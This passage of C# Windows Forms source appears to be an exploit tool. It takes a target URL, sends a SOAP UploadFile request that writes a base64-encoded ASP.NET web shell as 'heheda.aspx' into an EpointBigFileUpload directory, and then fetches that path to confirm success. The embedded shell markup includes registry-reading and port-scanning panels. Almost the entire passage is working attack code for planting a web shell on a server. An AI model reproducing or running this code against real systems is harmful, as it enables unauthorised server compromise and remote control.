nZlciIgV2lkdGg9Ijc2M3B4Ij48ZGl2IHN0eWxlPSJ0ZXh0LWFsaWduOmxlZnQiPgogICAgICAgICAgICA8aHIgLz4KICAgICAgICAgICAgPGFzcDpMYWJlbCBJRD0iQmluX2lpc0xhYmVsIiBydW5hdD0ic2VydmVyIiBUZXh0PSJMYWJlbCIgRW5hYmxlVmlld1N0YXRlPSJGYWxzZSI+PC9hc3A6TGFiZWw+Jm5ic3A7PC9kaXY+PC9hc3A6UGFuZWw+CiAgICAgICAgPGFzcDpQYW5lbCBJRD0iQmluX1JlZ1BhbmVsIiBydW5hdD0ic2VydmVyIiBXaWR0aD0iNzYzcHgiPjxociAvPjxkaXYgc3R5bGU9InRleHQtYWxpZ246bGVmdCI+CiAgICAgICAgICAgIEtFWSA6Jm5ic3A7ICZuYnNwOzxhc3A6VGV4dEJveCBJRD0iQmluX0tleVRleHRCb3giIHJ1bmF0PSJzZXJ2ZXIiIFdpZHRoPSI1OTVweCI+SEtFWV9MT0NBTF9NQUNISU5FXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXENvbXB1dGVyTmFtZVxDb21wdXRlck5hbWU8L2FzcDpUZXh0Qm94PjxiciAvPgogICAgICAgICAgICBWQUxVRSA6CiAgICAgICAgICAgIDxhc3A6VGV4dEJveCBJRD0iQmluX1ZhbHVlVGV4dEJveCIgcnVuYXQ9InNlcnZlciIgV2lkdGg9IjMxMnB4Ij5Db21wdXRlck5hbWU8L2FzcDpUZXh0Qm94PiZuYnNwOzxhc3A6QnV0dG9uCiAgICAgICAgICAgICAgICBJRD0iQmluX1JlZ3JlYWRCdXR0b24iIHJ1bmF0PSJzZXJ2ZXIiIFRleHQ9IlJlYWQiIE9uQ2xpY2s9IkJpbl9SZWdyZWFkQnV0dG9uX0NsaWNrIiAvPjxiciAvPgogICAgICAgICAgICA8YXNwOkxhYmVsIElEPSJCaW5fUmVncmVzTGFiZWwiIHJ1bmF0PSJzZXJ2ZXIiPjwvYXNwOkxhYmVsPjxociAvPjwvZGl2PjwvYXNwOlBhbmVsPgogICAgICAgIDxhc3A6UGFuZWwgSUQ9IkJpbl9Qb3J0UGFuZWwiIHJ1bmF0PSJzZXJ2ZXIiIFdpZHRoPSI3NjNweCI+CiAgICAgICAgICAgIDxociAvPjxkaXYgc3R5bGU9InRleHQtYWxpZ246bGVmdCI+CiAgICAgICAgICAgICAgICBJUCA6CiAgICAgICAgICAgICAgICA8YXNwOlRleHRCb3ggSUQ9IkJpbl9TY2FuaXBUZXh0Qm94IiBydW5hdD0ic2VydmVyIiBXaWR0aD0iMTk0cHgiPjEyNy4wLjAuMTwvYXNwOlRleHRCb3g+CiAgICAgICAgICAgICAgICBQT1JUIDoKICAgICAgICAgICAgPGFzcDpUZXh0Qm94IElEPSJCaW5fUG9ydHNUZXh0Qm94IiBydW5hdD0ic2VydmVyIiBXaWR0aD0iMzU2cHgiPjIxLDgwLDE0MzMsMzMwNiwzMzg5LDQ4OTksNTYzMSw0Mzk1OCw2NTUwMDwvYXNwOlRleHRCb3g+CiAgICAgICAgICAgICAgICA8YXNwOkJ1dHRvbiBJRD0iQmluX1NjYW5jbWRCdXR0b24iIHJ1bmF0PSJzZXJ2ZXIiIFRleHQ9IlNjYW4iIE9uQ2xpY2s9IkJpbl9TY2FuY21kQnV0dG9uX0NsaWNrIiAvPjxiciAvPgogICAgICAgICAgICAgICAgPGFzcDpMYWJlbCBJRD0iQmluX1NjYW5yZXNMYWJlbCIgcnVuYXQ9InNlcnZlciI+PC9hc3A6TGFiZWw+PC9kaXY+PGhyIC8+PC9hc3A6UGFuZWw+CiAgICAgICAgCiAgICA8L2Rpdj48L2Zvcm0+CjwvYm9keT4KPC9odG1sPgo=";

            DateTime now = DateTime.Now;
            now = new DateTime(Convert.ToInt64(DateTime.Now.Ticks));
            string a = EncryptOperate.SHA1Encrypt(now);


            XmlDocument doc = new XmlDocument();
            doc.InnerXml = @"<soap:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"">
              <soap:Body>
                <UploadFile xmlns=""http://tempuri.org/"">
                <fs>"+shell+@"</fs>
                <fileName>heheda.aspx</fileName>
                <dtTicks>" + DateTime.Now.Ticks + @"</dtTicks>
                <encryption>"+a+@"</encryption>
                </UploadFile>
              </soap:Body>
            </soap:Envelope>";



            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(allurl);
            //if (proxy != null) req.Proxy = new WebProxy(proxy, true);
            // req.Headers.Add("GetClientInfo", "http://tempuri.org/GetClientInfo");

            req.ContentType = "text/xml;charset=\"utf-8\"";
            req.Accept = "text/xml";
            req.Method = "POST";




            Stream stm = req.GetRequestStream();
            doc.Save(stm);
            stm.Close();
            WebResponse resp = req.GetResponse();

            stm = resp.GetResponseStream();
            StreamReader r = new StreamReader(stm);
         string res=r.ReadToEnd();
            textBox1.Text = res;


        }


        public void  senhttp(string myurl)
        {
            string allurl = myurl + "/EpointBigFileUpload/FCKFile/heheda.aspx";
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(allurl);
            request.Method = "GET";
            request.ContentType = "text/html;charset=UTF-8";

            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            if(Convert.ToInt32(response.StatusCode)== 200)
            {
                MessageBox.Show("成功");
                textBox3.Text =allurl ;
            }
            else
            {
                MessageBox.Show("失败");
            }
            response.Close();

        }
    
    public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string myurl = textBox2.Text.Trim();
            if(myurl=="")
            {
                MessageBox.Show("请输入地址");
            }
            else
            {
                sendSoapMessage(myurl);
                senhttp(myurl);

            }
           

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
